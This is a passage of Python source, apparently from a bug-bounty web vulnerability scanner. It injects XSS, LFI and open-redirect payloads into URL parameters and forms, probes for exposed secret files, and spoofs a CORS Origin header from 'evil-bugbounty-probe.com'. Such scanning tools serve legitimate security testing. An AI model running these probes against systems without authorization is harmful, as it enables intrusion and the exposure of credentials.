    def _scan_xss_param(self, findings: list, url: str, param: str, payloads: dict) -> None:
        base = payloads.get("reflected", XSS_PAYLOADS)
        polyglots = payloads.get("polyglot", [])
        all_payloads = list(base) + polyglots

        for payload in all_payloads:
            test_url = self._inject_param(url, param, payload)
            self._record_second_order(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue

            context = self._detect_xss_context(resp.text, payload)
            if not context:
                continue

            # Use context-aware payloads for this context
            context_payloads = CONTEXT_XSS_PAYLOADS.get(context, [payload])
            for ctx_payload in context_payloads:
                ctx_url = self._inject_param(url, param, ctx_payload)
                ctx_resp = safe_get(self.session, ctx_url, self.timeout)
                if not ctx_resp:
                    continue
                if ctx_payload not in ctx_resp.text and "49" not in ctx_resp.text:
                    continue

                # Stage 1: reflection detected
                # Stage 2: headless validation with screenshot capture
                screenshot_dir = self.config.get("output_dir", "reports")
                exec_result = self.browser.check_xss_execution(ctx_url, ctx_payload, screenshot_dir=screenshot_dir)

                if exec_result and (exec_result.get("alert_fired") or exec_result.get("dom_mutation")):
                    f = finding(
                        vuln_type="Confirmed XSS",
                        url=ctx_url,
                        severity="critical",
                        details=f"Parameter '{param}' — XSS execution verified via Playwright ({context} context)",
                        evidence=f"Payload: {ctx_payload} | Alert: {exec_result.get('alert_fired')} | DOM: {exec_result.get('dom_mutation')}",
                        request=_build_curl("GET", ctx_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=ctx_resp.text[:500],
                        parameter=param,
                        steps_to_reproduce=[f"Send request to {ctx_url}", f"Observe XSS execution: {ctx_payload[:80]}"],
                        verification_stage=VerificationStage.VERIFIED.value,
                        validation_steps=[
                            f"Payload reflected in {context} context",
                            f"Playwright confirmed execution: alert={exec_result.get('alert_fired')}, dom={exec_result.get('dom_mutation')}",
                        ],
                    )
                    if f:
                        if exec_result.get("screenshot_path"):
                            f["screenshot_path"] = exec_result["screenshot_path"]
                        findings.append(f)
                    log(f"  [XSS Verified] {ctx_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                else:
                    f = finding(
                        vuln_type="Reflected XSS",
                        url=ctx_url,
                        severity="high",
                        details=f"Parameter '{param}' reflects payload in {context} context (unverified execution)",
                        evidence=f"Payload: {ctx_payload}",
                        request=_build_curl("GET", ctx_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=ctx_resp.text[:500],
                        parameter=param,
                        steps_to_reproduce=[f"Send request to {ctx_url}", f"Observe payload reflection: {ctx_payload[:80]}"],
                        verification_stage=VerificationStage.DETECTED.value,
                        validation_steps=[f"Reflection in {context} context detected (no headless browser available for execution verification)"],
                    )
                    if f:
                        findings.append(f)
                    log(f"  [XSS Detected] {ctx_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                break

    def _scan_xss_form(self, findings: list, form: dict, field_name: str, payloads: dict) -> None:
        action = form.get("action", "")
        method = form.get("method", "get").upper()
        base_payloads = payloads.get("reflected", XSS_PAYLOADS)
        polyglots = payloads.get("polyglot", [])
        all_payloads = list(base_payloads) + polyglots

        for payload in all_payloads:
            data = {f["name"]: f.get("value", "test") for f in form.get("fields", []) if f.get("name")}
            data[field_name] = payload
            self._record_second_order(action or "", field_name, payload)

            if method == "POST":
                resp = safe_post(self.session, action, data, self.timeout)
                confirm_url = action + "?" + urlencode(data)
            else:
                confirm_url = action + "?" + urlencode(data)
                resp = safe_get(self.session, confirm_url, self.timeout)

            if not resp:
                continue

            context = self._detect_xss_context(resp.text, payload)
            if not context:
                continue

            context_payloads = CONTEXT_XSS_PAYLOADS.get(context, [payload])
            for ctx_payload in context_payloads:
                d2 = dict(data)
                d2[field_name] = ctx_payload

                if method == "POST":
                    r = safe_post(self.session, action, d2, self.timeout)
                else:
                    r = safe_get(self.session, action + "?" + urlencode(d2), self.timeout)

                if not r:
                    continue
                if ctx_payload not in r.text and "49" not in r.text:
                    continue

                screenshot_dir = self.config.get("output_dir", "reports")
                exec_result = self.browser.check_xss_execution(confirm_url, ctx_payload, html_content=r.text if method == "POST" else None, screenshot_dir=screenshot_dir)

                if exec_result and (exec_result.get("alert_fired") or exec_result.get("dom_mutation")):
                    f = finding(
                        vuln_type="Confirmed XSS",
                        url=confirm_url,
                        severity="critical",
                        details=f"Form field '{field_name}' — XSS execution verified ({context} context)",
                        evidence=f"Payload: {ctx_payload}",
                        request=_build_curl(method, confirm_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        parameter=field_name,
                        steps_to_reproduce=[f"Send {method} request to {confirm_url}", f"Observe XSS execution: {ctx_payload[:80]}"],
                        verification_stage=VerificationStage.VERIFIED.value,
                        validation_steps=["Form reflection + Playwright execution verified",
                                          f"Screenshot: {exec_result.get('screenshot_path', 'N/A')}"],
                    )
                    if f:
                        if exec_result.get("screenshot_path"):
                            f["screenshot_path"] = exec_result["screenshot_path"]
                        findings.append(f)
                    log(f"  [XSS Form Verified] {confirm_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                else:
                    f = finding(
                        vuln_type="Reflected XSS",
                        url=confirm_url,
                        severity="high",
                        details=f"Form field '{field_name}' reflects in {context} context",
                        evidence=f"Payload: {ctx_payload}",
                        request=_build_curl(method, confirm_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        parameter=field_name,
                        steps_to_reproduce=[f"Send {method} request to {confirm_url}", f"Observe payload reflection: {ctx_payload[:80]}"],
                        verification_stage=VerificationStage.DETECTED.value,
                        validation_steps=[f"Reflection in {context} context (unverified execution)"],
                    )
                    if f:
                        findings.append(f)
                    log(f"  [XSS Form Detected] {confirm_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                break

    # ═════════════════════════════════════════════════════════════════════
    # Blind XSS — OOB-Based Stored XSS Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_blind_xss(self, target_urls: list[str] | None = None) -> list[dict]:
        result = self._dispatch_to_scanner("blind_xss")
        if result is not None:
            return result
        return []

    # ═════════════════════════════════════════════════════════════════════
    # LFI
    # ═════════════════════════════════════════════════════════════════════

    def scan_lfi(self, target_urls: list[str] | None = None) -> list[dict]:
        if result := self._dispatch_to_scanner("lfi", target_urls):
            return result
        findings: list[dict] = []
        lfi_payloads = self._load_payloads("lfi")
        raw_urls = self._urls_with_params() if target_urls is None else [u for u in target_urls if "?" in u]
        for url in raw_urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    # Baseline: fetch with original param value
                    baseline_resp = safe_get(self.session, url, self.timeout)
                    baseline_body = baseline_resp.text if baseline_resp else ""
                    for payload in lfi_payloads:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp:
                                body = resp.text
                                for sig in LFI_SIGNATURES:
                                    if sig in body and sig not in baseline_body:
                                        f = finding(
                                            vuln_type="Local File Inclusion",
                                            url=test_url,
                                            severity="critical",
                                            details=f"Parameter '{param}' includes local file (signature: {sig!r})",
                                            evidence=f"Payload: {payload}",
                                            request=_build_curl("GET", test_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                                            response_excerpt=resp.text[:500],
                                            parameter=param,
                                            steps_to_reproduce=[f"Send request to {test_url}", f"Observe: {sig}"],
                                            verification_stage=VerificationStage.VALIDATED.value,
                                            validation_steps=[f"LFI signature '{sig}' found in response"],
                                        )
                                        if f and self._add(f):
                                            findings.append(f)
                                        log(f"  [LFI] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                        break
                        except Exception:
                            continue
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Open Redirect
    # ═════════════════════════════════════════════════════════════════════

    def scan_open_redirect(self, target_urls: list[str] | None = None) -> list[dict]:
        if result := self._dispatch_to_scanner("open_redirect", target_urls):
            return result
        findings: list[dict] = []
        urls = self.recon.get("urls", []) if target_urls is None else target_urls
        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                params = list(parse_qs(urlparse(url).query).keys())
                redirect_params = [p for p in params if p.lower() in REDIRECT_PARAMS]
                if not redirect_params:
                    continue
                for param in redirect_params:
                    for payload in OPEN_REDIRECT_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout, allow_redirects=False)
                            if not resp:
                                continue
                            loc = resp.headers.get("Location", "")
                            if "evil.com" in loc:
                                f = finding(
                                    vuln_type="Open Redirect",
                                    url=test_url,
                                    severity="medium",
                                    details=f"Parameter '{param}' redirects to external domain",
                                    evidence=f"Location: {loc[:100]}",
                                    request=_build_curl("GET", test_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                                    response_excerpt=resp.text[:500],
                                    parameter=param,
                                    steps_to_reproduce=[f"Send request to {test_url}", f"Observe redirect to {loc[:80]}"],
                                    verification_stage=VerificationStage.VALIDATED.value,
                                    validation_steps=[f"Redirect header contains external domain: {loc[:60]}"],
                                )
                                if f and self._add(f):
                                    findings.append(f)
                                log(f"  [REDIRECT] {test_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                                break
                        except Exception:
                            continue
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # CSRF
    # ═════════════════════════════════════════════════════════════════════

    def scan_csrf(self, target_urls: list[str] | None = None) -> list[dict]:
        if result := self._dispatch_to_scanner("csrf", target_urls):
            return result
        findings: list[dict] = []
        forms = self.recon.get("forms", [])
        if target_urls is not None:
            origins = {urlparse(u).scheme + "://" + urlparse(u).netloc for u in target_urls}
            forms = [
                f for f in forms
                if any(urlparse(f.get("action", f.get("url", ""))).scheme + "://" + urlparse(f.get("action", f.get("url", ""))).netloc == o for o in origins)
            ]
        for form in forms:
            try:
                form_action = form.get("action", form.get("url", ""))
                if form_action and not self._in_scope(form_action):
                    continue
                if form.get("method", "GET").upper() != "POST":
                    continue
                token_found = any(
                    f.get("name", "").lower() in CSRF_TOKEN_NAMES
                    for f in form.get("fields", [])
                )
                if not token_found:
                    f = finding(
                        vuln_type="Missing CSRF Protection",
                        url=form_action,
                        severity="medium",
                        details="POST form does not contain a known anti-CSRF token field",
                        evidence=f"Form fields: {[fld.get('name') for fld in form.get('fields', [])]}",
                        request=_build_curl("POST", form_action, {}, data={
                            fld.get("name", "field"): fld.get("value", "test")
                            for fld in form.get("fields", [])[:5]
                        }),
                        response_excerpt="(no request made — vulnerability detected from form structure)",
                        steps_to_reproduce=[
                            f"Navigate to the page containing the form at {form_action}",
                            "Submit the POST form without a CSRF token",
                            "Observe that the server accepts the request without token validation",
                        ],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [CSRF] {form_action}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Directory Fuzzing
    # ═════════════════════════════════════════════════════════════════════

    def scan_directory_fuzz(self, target_urls: list[str] | None = None) -> list[dict]:
        if result := self._dispatch_to_scanner("dirb"):
            return result
        findings: list[dict] = []
        urls = self.recon.get("urls", [])
        if not urls:
            return self._get_findings()

        base = urlparse(self.config.get("target", "")).netloc
        if not base:
            return self._get_findings()

        paths = COMMON_DIRFUZZ_PATHS[:]
        custom_wordlist = self.config.get("wordlist")
        if custom_wordlist:
            try:
                with open(custom_wordlist, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and line not in paths:
                            paths.append(line)
            except Exception:
                pass

        delay = self.config.get("delay", 0)
        for path in paths:
            try:
                target_url = f"{self.config.get('target').rstrip('/')}/{path.lstrip('/')}"
                if not self._in_scope(target_url):
                    continue
                resp = safe_get(self.session, target_url, self.timeout, raise_for_status=False)
                if delay:
                    time.sleep(delay)
                if resp and resp.status_code == 200:
                    title = "Exposed Common Path"
                    details = f"Accessible path found: {target_url}"
                    if any(kw in resp.text.lower() for kw in ["index of /", "directory listing", "parent directory"]):
                        title = "Directory Listing Enabled"
                        details = f"Index listing detected at {target_url}"
                    f = finding(
                        vuln_type=title,
                        url=target_url,
                        severity="medium",
                        details=details,
                        evidence=f"HTTP {resp.status_code}",
                        request=_build_curl("GET", target_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        steps_to_reproduce=[f"Send request to {target_url}", "Observe HTTP 200 response"],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [DIRB] {target_url}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                elif resp and resp.status_code == 403:
                    f = finding(
                        vuln_type="Forbidden Path (Access Control Exists)",
                        url=target_url,
                        severity="info",
                        details=f"Path exists but is access-controlled (HTTP 403): {target_url}",
                        evidence=f"HTTP 403",
                        request=_build_curl("GET", target_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        steps_to_reproduce=[f"Send request to {target_url}", "Observe HTTP 403 response"],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [DIRB 403] {target_url}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                elif resp and resp.status_code == 401:
                    f = finding(
                        vuln_type="Authentication Required Path",
                        url=target_url,
                        severity="info",
                        details=f"Path requires authentication (HTTP 401): {target_url}",
                        evidence=f"HTTP 401",
                        request=_build_curl("GET", target_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        steps_to_reproduce=[f"Send request to {target_url}", "Observe HTTP 401 response"],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [DIRB 401] {target_url}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Exposed Files
    # ═════════════════════════════════════════════════════════════════════

    def scan_exposed_files(self, target_urls: list[str] | None = None) -> list[dict]:
        if result := self._dispatch_to_scanner("exposed_files"):
            return result
        findings: list[dict] = []
        target_base = self.config.get("target", "").rstrip("/")
        for exposed_file in EXPOSED_FILES:
            try:
                file_url = target_base + exposed_file
                if not self._in_scope(file_url):
                    continue
                resp = safe_get(self.session, file_url, self.timeout, raise_for_status=False)
                if not (resp and resp.status_code == 200):
                    continue
                severity, details = self._exposed_file_metadata(exposed_file)
                body = resp.text
                ext = exposed_file.lower()
                content_ok = True
                if ".env" in ext and "=" not in body:
                    content_ok = False
                elif "/.git/config" in ext and "[core]" not in body:
                    content_ok = False
                elif "phpinfo" in ext and "PHP Version" not in body:
                    content_ok = False
                elif any(ext.endswith(s) for s in (".zip", ".tar.gz", ".gz", ".sql")):
                    raw = resp.content
                    if ext.endswith(".zip") and raw[:2] != b"PK":
                        content_ok = False
                    elif ext.endswith(".gz") and raw[:2] != b"\x1f\x8b":
                        content_ok = False
                    elif ext.endswith(".sql") and not any(body.lstrip().startswith(w) for w in ("-- ", "CREATE", "INSERT", "DROP", "ALTER", "SELECT")):
                        content_ok = False
                if not content_ok:
                    severity = "info"
                    details += " (content check failed — may be a generic 200 response)"
                f = finding(
                    vuln_type="Exposed Sensitive File",
                    url=file_url,
                    severity=severity,
                    details=details,
                    evidence=f"HTTP {resp.status_code} — {len(resp.text)} bytes",
                    request=_build_curl("GET", file_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                    response_excerpt=resp.text[:500],
                    steps_to_reproduce=[f"Send request to {file_url}", f"Observe: {details[:100]}"],
                    verification_stage=VerificationStage.VALIDATED.value,
                    validation_steps=[f"File accessible at {file_url} (HTTP 200)"],
                )
                if f and self._add(f):
                    findings.append(f)
                log(f"  [EXPOSED] {file_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return findings

    def _exposed_file_metadata(self, exposed_file: str) -> tuple[str, str]:
        lower_path = exposed_file.lower()
        if ".env" in exposed_file or "config" in lower_path:
            return "critical", "Configuration file containing potential secrets is accessible"
        if "backup" in lower_path:
            return "high", "Backup archive is publicly accessible"
        if ".git" in exposed_file or ".DS_Store" in exposed_file:
            return "high", "Version control metadata is exposed"
        if "phpinfo" in exposed_file:
            return "high", "PHP information disclosure via phpinfo()"
        if ".ssh" in exposed_file or ".aws" in exposed_file:
            return "critical", "Credentials file is publicly accessible"
        return "critical", "Sensitive file is publicly accessible"

    # ═════════════════════════════════════════════════════════════════════
    # Sensitive Data
    # ═════════════════════════════════════════════════════════════════════

    def scan_sensitive_data(self, target_urls: list[str] | None = None) -> list[dict]:
        if result := self._dispatch_to_scanner("sensitive", target_urls):
            return result
        return []

    # ═════════════════════════════════════════════════════════════════════
    # Headers
    # ═════════════════════════════════════════════════════════════════════

    def scan_headers(self, target_urls: list[str] | None = None) -> list[dict]:
        result = self._dispatch_to_scanner("headers", target_urls)
        if result is not None:
            return result
        return []

    def _scan_missing_headers(self, findings: list[dict], target: str, resp) -> None:
        for header, severity in SECURITY_HEADERS.items():
            if header in resp.headers:
                continue
            f = finding(
                vuln_type=f"Missing Security Header: {header}",
                url=target,
                severity=severity,
                details=f"Response is missing the '{header}' header",
                evidence=f"Headers present: {', '.join(list(resp.headers.keys())[:5])}",
                request=_build_curl("GET", target, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                response_excerpt=resp.text[:500],
                steps_to_reproduce=[f"Send GET request to {target}", f"Observe missing header: {header}"],
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)

    def _scan_disclosure_headers(self, findings: list[dict], target: str, resp) -> None:
        server = resp.headers.get("Server", "")
        if server and any(c.isdigit() for c in server):
            f = finding(
                vuln_type="Information Disclosure (Server)",
                url=target,
                severity="low",
                details=f"Server header reveals version: {server!r}",
                evidence=f"Server: {server!r}",
                request=_build_curl("GET", target, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                response_excerpt=resp.text[:500],
                steps_to_reproduce=[f"Send GET request to {target}", f"Observe server header: {server!r}"],
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)
        for header, title in (
            ("X-Powered-By", "Information Disclosure (X-Powered-By)"),
            ("X-AspNet-Version", "Information Disclosure (X-AspNet-Version)"),
        ):
            value = resp.headers.get(header, "")
            if value:
                f = finding(
                    vuln_type=title,
                    url=target,
                    severity="low",
                    details=f"{header} reveals tech stack: {value!r}",
                    evidence=f"{header}: {value!r}",
                    request=_build_curl("GET", target, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                    response_excerpt=resp.text[:500],
                    steps_to_reproduce=[f"Send GET request to {target}", f"Observe {header} header: {value!r}"],
                    verification_stage=VerificationStage.DETECTED.value,
                )
                if f:
                    findings.append(f)

    def _scan_policy_headers(self, findings: list[dict], target: str, resp) -> None:
        csp = resp.headers.get("Content-Security-Policy", "")
        if csp and any(token in csp.lower() for token in ["unsafe-inline", "unsafe-eval", "data:"]):
            f = finding(
                vuln_type="Weak Content Security Policy",
                url=target,
                severity="medium",
                details="CSP contains potentially unsafe directives (unsafe-inline, unsafe-eval, or data:).",
                evidence=f"CSP: {csp[:200]}",
                request=_build_curl("GET", target, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                response_excerpt=resp.text[:500],
                steps_to_reproduce=[f"Send GET request to {target}", "Observe CSP with unsafe directives"],
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acc = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
        if acao == "*" and acc == "true":
            f = finding(
                vuln_type="Insecure CORS Configuration",
                url=target,
                severity="high",
                details="Access-Control-Allow-Origin is '*' while credentials are allowed.",
                evidence=f"Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: {acc}",
                request=_build_curl("GET", target, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                response_excerpt=resp.text[:500],
                steps_to_reproduce=[f"Send GET request to {target}", f"Observe CORS: {acao} with {acc}"],
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)
        elif acao == "*":
            f = finding(
                vuln_type="Overly Permissive CORS",
                url=target,
                severity="low",
                details="Access-Control-Allow-Origin is set to '*'.",
                evidence=f"Access-Control-Allow-Origin: {acao}",
                request=_build_curl("GET", target, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                response_excerpt=resp.text[:500],
                steps_to_reproduce=[f"Send GET request to {target}", f"Observe CORS: {acao}"],
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)

        # CORS Origin reflection probe
        try:
            evil_origin = "https://evil-bugbounty-probe.com"
            probe_headers = {"Origin": evil_origin}
            probe_resp = safe_get(self.session, target, self.timeout, headers=probe_headers)
            if probe_resp:
                reflected_acao = probe_resp.headers.get("Access-Control-Allow-Origin", "")
                reflected_acc = probe_resp.headers.get("Access-Control-Allow-Credentials", "").lower()
                if reflected_acao.strip() == evil_origin and reflected_acc == "true":
                    f = finding(
                        vuln_type="CORS Origin Reflection",
                        url=target,
                        severity="critical",
                        details="Access-Control-Allow-Origin reflects Origin header verbatim with credentials allowed — full account access risk",
                        evidence=f"Origin: {evil_origin} -> ACAO: {reflected_acao}, ACC: {reflected_acc}",
                        request=_build_curl("GET", target, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=probe_resp.text[:500],
                        steps_to_reproduce=[f"Send GET request to {target} with Origin: {evil_origin}", "Observe reflected ACAO header"],
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=[
                            f"Sent request with Origin: {evil_origin}",
                            f"ACAO reflected: {reflected_acao}",
                            "Credentials allowed: true — full CORS trust to arbitrary origin",
                        ],
                    )
                    if f:
                        findings.append(f)
        except Exception:
            pass

    def _scan_cookie_headers(self, findings: list[dict], target: str, resp) -> None:
        cookie_vals = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else [resp.headers.get("Set-Cookie", "")]
        for cookie in cookie_vals:
            if not cookie:
                continue
            missing = []
            if "secure" not in cookie.lower():
                missing.append("Secure")
            if "httponly" not in cookie.lower():
                missing.append("HttpOnly")
            if missing:
                f = finding(
                    vuln_type="Insecure Session Cookie",
                    url=target,
                    severity="medium",
                    details=f"Set-Cookie missing {', '.join(missing)} flags.",
                    evidence=f"Set-Cookie: {cookie[:120]}",
                    request=_build_curl("GET", target, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                    response_excerpt=resp.text[:500],
                    steps_to_reproduce=[f"Send GET request to {target}", f"Observe insecure cookie flags: {', '.join(missing)}"],
                    verification_stage=VerificationStage.DETECTED.value,
                )
                if f:
                    findings.append(f)

    # ═════════════════════════════════════════════════════════════════════
    # Clickjacking
    # ═════════════════════════════════════════════════════════════════════

    def scan_clickjacking(self, target_urls: list[str] | None = None) -> list[dict]:
        if result := self._dispatch_to_scanner("clickjacking"):
            return result
        findings: list[dict] = []
        target = self.config.get("target", "")
        if not target or not self._in_scope(target):
            return findings
        try:
            resp = safe_get(self.session, target, self.timeout, raise_for_status=False)
            if not resp:
                return findings
            x_frame = resp.headers.get("X-Frame-Options", "").lower()
            csp = resp.headers.get("Content-Security-Policy", "").lower()
            allows_frame = not any(directive in csp for directive in CLICKJACKING_SAFE_DIRECTIVES)
            missing_protection = not x_frame and allows_frame
            if missing_protection:
                f = finding(
                    vuln_type="Clickjacking Exposure",
                    url=target,
                    severity="medium",
                    details="The application does not enforce frame protection headers.",
                    evidence=f"X-Frame-Options: {x_frame or 'missing'}, CSP: {csp or 'missing'}",
                    request=_build_curl("GET", target, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                    response_excerpt=resp.text[:500],
                    steps_to_reproduce=[f"Send GET request to {target}", "Observe missing X-Frame-Options header"],
                    verification_stage=VerificationStage.DETECTED.value,
                )
                if f and self._add(f):
                    findings.append(f)
                log(f"  [CLICKJACKING] {target}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        except Exception:
            pass
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # HTTP Methods
    # ═════════════════════════════════════════════════════════════════════

    def scan_http_methods(self, target_urls: list[str] | None = None) -> list[dict]:
        if result := self._dispatch_to_scanner("http_methods", target_urls):
            return result
        findings: list[dict] = []
        targets = target_urls if target_urls else [self.config.get("target", "")]
        for target in targets:
            if not target or not self._in_scope(target):
                continue
            try:
                resp = self.session.options(target, timeout=self.timeout)
                if not resp:
                    continue
                allow_header = resp.headers.get("Allow", "")
                cors_methods = resp.headers.get("Access-Control-Allow-Methods", "")
                methods = set(self._normalize_list(allow_header) + self._normalize_list(cors_methods))
                dangerous = {"TRACE", "PUT", "DELETE", "PATCH", "PROPFIND"}
                exposed = [m for m in methods if m.upper() in dangerous]
                if exposed:
                    f = finding(
                        vuln_type="Dangerous HTTP Methods Enabled",
                        url=target,
                        severity="medium",
                        details="The server supports non-safe HTTP methods.",
                        evidence=f"Allowed methods: {', '.join(sorted(methods))}",
                        request=_build_curl("OPTIONS", target, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        steps_to_reproduce=[f"Send OPTIONS request to {target}", f"Observe dangerous methods: {', '.join(exposed)}"],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [HTTP METHODS] {target} -> {', '.join(exposed)}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception:
                pass
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Insecure Forms
    # ═════════════════════════════════════════════════════════════════════

    def scan_insecure_forms(self, target_urls: list[str] | None = None) -> list[dict]:
        if result := self._dispatch_to_scanner("insecure_forms", target_urls):
            return result
        findings: list[dict] = []
        forms = self.recon.get("forms", [])
        if target_urls is not None:
            origins = {urlparse(u).scheme + "://" + urlparse(u).netloc for u in target_urls}
            forms = [
                f for f in forms
                if any(urlparse(f.get("action", "")).scheme + "://" + urlparse(f.get("action", "")).netloc == o for o in origins)
            ]
        for form in forms:
            try:
                method = form.get("method", "get").lower()
                action = form.get("action", "")
                if not action or method != "post":
                    continue
                parsed = urlparse(action)
                if parsed.scheme == "http":
                    f = finding(
                        vuln_type="Insecure Form Action",
                        url=action,
                        severity="high",
                        details="A POST form submits data over an insecure HTTP connection.",
                        evidence="Form action uses http:// scheme",
                        request=_build_curl("POST", action, {}, data={
                            field.get("name", "field"): field.get("value", "test")
                            for field in form.get("fields", [])[:5]
                        }),
                        response_excerpt="(no request made — vulnerability detected from form structure)",
                        steps_to_reproduce=[
                            f"Navigate to page with form action {action}",
                            "Submit the form over HTTP",
                            "Observe credentials submitted in cleartext",
                        ],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [FORM] {action}", Colors.RED, verbose_only=True, verbose=self.verbose)
                    continue
                if any(field.get("type") == "password" for field in form.get("fields", [])):
                    if parsed.netloc and not self._same_origin(action):
                        f = finding(
                            vuln_type="Password Form Cross-Origin Submission",
                            url=action,
                            severity="high",
                            details="A password field submits to a different origin.",
                            evidence=f"Action host: {parsed.netloc}",
                            request=_build_curl("POST", action, {}, data={
                                field.get("name", "field"): field.get("value", "test")
                                for field in form.get("fields", [])[:5]
                            }),
                            response_excerpt="(no request made — vulnerability detected from form structure)",
                            steps_to_reproduce=[
                                f"Navigate to page with form action {action}",
                                "Submit the form to cross-origin endpoint",
                                "Observe credentials submitted cross-origin",
                            ],
                            verification_stage=VerificationStage.DETECTED.value,
                        )
                        if f and self._add(f):
                            findings.append(f)
                        log(f"  [FORM] {action}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Subdomain Takeover
    # ═════════════════════════════════════════════════════════════════════

    def scan_subdomain_takeover(self, target_urls: list[str] | None = None) -> list[dict]:
        if result := self._dispatch_to_scanner("subdomain_takeover"):
            return result
        findings: list[dict] = []
        for subdomain in self.recon.get("subdomains", []):
            try:
                for scheme in ("http://", "https://"):
                    target_url = f"{scheme}{subdomain}"
                    if not self._in_scope(target_url):
                        continue
                    resp = safe_get(self.session, target_url, self.timeout, raise_for_status=False)
                    if not resp or not resp.text:
                        continue
                    body = resp.text
                    for signature in TAKEOVER_SIGNATURES:
                        if signature.lower() in body.lower():
                            f = finding(
                                vuln_type="Subdomain Takeover",
                                url=target_url,
                                severity="high",
                                details="A known takeover fingerprint was detected on the subdomain.",
                                evidence=f"Signature: {signature}",
                                request=_build_curl("GET", target_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                                response_excerpt=resp.text[:500],
                                steps_to_reproduce=[f"Send GET request to {target_url}", f"Observe takeover signature: {signature}"],
                                verification_stage=VerificationStage.DETECTED.value,
                            )
                            if f and self._add(f):
                                findings.append(f)
                            log(f"  [TAKEOVER] {target_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                            raise StopIteration
            except StopIteration:
                continue
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Rate Limiting
    # ═════════════════════════════════════════════════════════════════════

    def scan_rate_limiting(self, target_urls: list[str] | None = None) -> list[dict]:
        """Test auth-related endpoints for missing or weak rate limiting.

        Builds a candidate list from known auth paths AND forms discovered
        during recon that contain password/secret fields.  Sends 20 rapid
        POST requests with probe credentials, skipping 404/410 endpoints.

        Args:
